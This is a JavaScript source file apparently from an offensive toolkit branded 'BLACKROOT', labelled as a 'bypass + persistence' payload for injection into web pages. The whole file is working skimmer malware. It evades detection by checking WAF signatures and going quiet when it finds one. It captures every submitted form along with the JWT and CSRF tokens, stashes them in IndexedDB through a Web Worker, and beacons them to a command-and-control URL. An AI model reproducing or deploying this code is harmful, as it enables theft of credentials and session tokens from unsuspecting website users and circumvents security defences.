/* payloads/desktop.js  – Week-7 bypass + persistence */
(() => {
  const UUID = "{{UUID}}";               // injected by esbuild define
  const BEACON_URL = `https://your-control-node.com/beacon/${UUID}`;
  const REDIS_WAF_CHANNEL = "waf_signatures";

  /* ---------- 1. Anti-bot & WAF bypass ---------- */
  const isWAF = () => {
    const sigs = JSON.parse(localStorage.getItem("waf_sigs") || "[]");
    return sigs.some(s => navigator.userAgent.includes(s));
  };

  const fetchWAF = async () => {
    try {
      const res = await fetch("/redis_channel_proxy?channel=waf_signatures");
      const sigs = await res.json();
      localStorage.setItem("waf_sigs", JSON.stringify(sigs));
    } catch { /* ignore */ }
  };
  fetchWAF(); // refresh every page load

  const shouldInject = !isWAF();
  if (!shouldInject) {
    console.log("[BLACKROOT] WAF detected – benign payload only");
    return;
  }

  /* ---------- 2. SwarmMesh token-bucket rate limit ---------- */
  const RATE_LIMIT = 10; // requests per minute
  let tokens = RATE_LIMIT;
  const refill = () => {
    if (tokens < RATE_LIMIT) tokens += 1;
  };
  setInterval(refill, 6000);

  const limitedFetch = (url, data) => {
    if (tokens <= 0) return;
    tokens -= 1;
    return navigator.sendBeacon
      ? navigator.sendBeacon(url, data)
      : new Image().src = `${url}?d=${encodeURIComponent(data)}`;
  };

  /* ---------- 3. Session persistence via Web-Worker + IndexedDB ---------- */
  const workerCode = `
const BEACON = "${BEACON_URL}";
const DB_NAME = "br";
const STORE = "stash";
let db;

const open = indexedDB.open(DB_NAME, 1);
open.onupgradeneeded = () => {
  db = open.result.createObjectStore(STORE, { keyPath: "id", autoIncrement: true });
};
open.onsuccess = () => { db = open.result; };

function send(data) {
  fetch(BEACON, { method: "POST", body: JSON.stringify(data), keepalive: true });
}

setInterval(() => {
  if (!db) return;
  const tx = db.transaction(STORE, "readonly");
  const all = tx.objectStore(STORE).getAll();
  all.onsuccess = () => {
    if (all.result.length) {
      send(all.result);
      const clear = db.transaction(STORE, "readwrite").objectStore(STORE).clear();
    }
  };
}, 30000);

self.onmessage = e => {
  if (!db) return;
  const tx = db.transaction(STORE, "readwrite");
  tx.objectStore(STORE).add(e.data);
};
`;

  const blob = new Blob([workerCode], { type: "application/javascript" });
  const worker = new Worker(URL.createObjectURL(blob));

  /* ---------- 4. Hook forms & tokens ---------- */
  const hook = () => {
    document.querySelectorAll("form").forEach(form => {
      form.addEventListener("submit", e => {
        const fd = new FormData(form);
        const obj = Object.fromEntries(fd.entries());
        // grab JWT / CSRF
        obj._jwt = localStorage.getItem("jwt") || document.cookie.match(/jwt=([^;]+)/)?.[1];
        obj._csrf = document.querySelector("[name=csrf]")?.value;
        obj._ts = Date.now();
        worker.postMessage(obj);
      });
    });
  };

  if (document.readyState === "loading")
    document.addEventListener("DOMContentLoaded", hook);
  else hook();
})();